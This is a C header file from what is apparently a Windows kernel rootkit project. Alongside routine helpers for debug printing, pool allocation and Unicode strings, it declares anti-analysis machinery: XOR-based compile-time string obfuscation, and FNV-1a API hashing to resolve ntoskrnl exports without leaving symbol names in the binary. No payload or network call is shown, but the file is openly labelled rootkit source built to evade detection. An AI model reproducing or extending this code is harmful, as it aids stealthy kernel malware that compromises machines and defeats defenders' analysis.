/*==============================================================================
 * rootkit/src/utils.h
 *------------------------------------------------------------------------------
 * Shared macros, typedefs, and helper declarations for the kernel driver.
 *============================================================================*/
#pragma once
#include <ntddk.h>
#include <ntstrsafe.h>
#include "../inc/config.h"
#include "../inc/common.h"
#include "../inc/undoc.h"

/*==============================================================================
 * DEBUG GATE
 *------------------------------------------------------------------------------
 * RK_DBG prints only in debug builds (_DEBUG defined). In release builds
 * it compiles to nothing (zero overhead).
 *============================================================================*/
#ifdef _DEBUG
    #define RK_DBG(fmt, ...) \
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KdmpRt: " fmt "\n", ##__VA_ARGS__)
#else
    #define RK_DBG(fmt, ...) ((void)0)
#endif

/*==============================================================================
 * STATUS SHORT-CIRCUIT MACRO
 *------------------------------------------------------------------------------
 * RK_TRY(expr) evaluates expr, returns immediately on failure.
 * Usage: RK_TRY(some_function());
 *============================================================================*/
#define RK_TRY(expr) \
    do { NTSTATUS _s = (expr); if (!NT_SUCCESS(_s)) return _s; } while (0)

/*==============================================================================
 * POOL MANAGEMENT (NonPagedPoolNx)
 *------------------------------------------------------------------------------
 * All allocations use the 'Kdmp' tag for tracking. Secure free wipes memory
 * before returning to pool.
 *============================================================================*/
PVOID rk_alloc(SIZE_T size, ULONG tag);
PVOID rk_alloc_zero(SIZE_T size, ULONG tag);
VOID  rk_free(PVOID p, ULONG tag);
VOID  rk_secure_free(PVOID p, SIZE_T size, ULONG tag);

/*==============================================================================
 * STRING OBFUSCATION (XORSTR)
 *------------------------------------------------------------------------------
 * Runtime XOR-decryption of compile-time encrypted string literals.
 * The build script (build/xorstr.py) rewrites XORSTR("literal") into an
 * encrypted byte array + decrypt call. In unprocessed source, XORSTR()
 * degrades to a plain string so the project builds without the preprocessor.
 *
 * XOR_KEY is defined in config.h (default 0x5A).
 *============================================================================*/
#define XORSTR_MAX 260
BOOLEAN rk_xor_decrypt(const UCHAR* enc, SIZE_T enc_len, UCHAR* out, SIZE_T out_cap);

#ifdef RK_XORSTR_PROCESSED
    #define XORSTR(s) rk_xorstr_decrypt_literal(s)
#else
    #define XORSTR(s) ((const char*)(s))
#endif

/*==============================================================================
 * API HASHING (FNV-1a 64-bit)
 *------------------------------------------------------------------------------
 * Used for runtime export resolution without leaving symbol names in .rdata.
 * Hash is computed over lowercased ANSI strings.
 *============================================================================*/
static __forceinline ULONG64 rk_fnv1a(const char* s) {
    ULONG64 h = 0xCBF29CE484222325ULL;  /* FNV offset basis */
    while (*s) {
        char c = *s++;
        if (c >= 'A' && c <= 'Z') c += 0x20;  /* to lowercase */
        h ^= (UCHAR)c;
        h *= 0x100000001B3ULL;  /* FNV prime */
    }
    return h;
}

/* Resolve an export in ntoskrnl.exe by its FNV-1a hash. */
PVOID rk_resolve_nt(ULONG64 hash);

/*==============================================================================
 * SAFE UNICODE HELPERS
 *------------------------------------------------------------------------------
 * Convert raw UTF-16LE bytes to UNICODE_STRING with pool allocation.
 *============================================================================*/
NTSTATUS rk_unicode_from_bytes(PUNICODE_STRING out, const UCHAR* bytes, USHORT byte_len);
VOID     rk_unicode_free(PUNICODE_STRING s);

/*==============================================================================
 * MISCELLANEOUS
 *============================================================================*/
#define RK_ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))